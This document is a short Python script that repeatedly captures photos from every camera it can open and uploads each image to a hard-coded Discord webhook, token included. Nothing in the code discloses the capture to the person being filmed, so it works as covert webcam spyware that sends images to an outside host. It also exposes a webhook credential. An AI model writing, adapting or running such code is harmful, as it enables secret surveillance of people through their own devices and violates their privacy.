import cv2
import requests
import time

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1378995998826958878/N_ZyfXxxRHP8wdIHzpZIBi3FB8VjOwS4PS8ORW1x6JGdvxtw7mUN-E7MB5quEw1KoDMO"

def take_photo(cam_index):
    cap = cv2.VideoCapture(cam_index)
    if not cap.isOpened():
        cap.release()
        return None
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None
    filename = f"camera_{cam_index}.jpg"
    cv2.imwrite(filename, frame)
    return filename

def send_to_discord(filename):
    with open(filename, 'rb') as f:
        response = requests.post(DISCORD_WEBHOOK_URL, files={"file": f})
    return response.status_code == 204

def capture_and_send_all_cameras(max_cams=10):
    for cam_index in range(max_cams):
        filename = take_photo(cam_index)
        if filename:
            send_to_discord(filename)

def main():
    while True:
        capture_and_send_all_cameras()
        time.sleep(1)

if __name__ == "__main__":
    main()
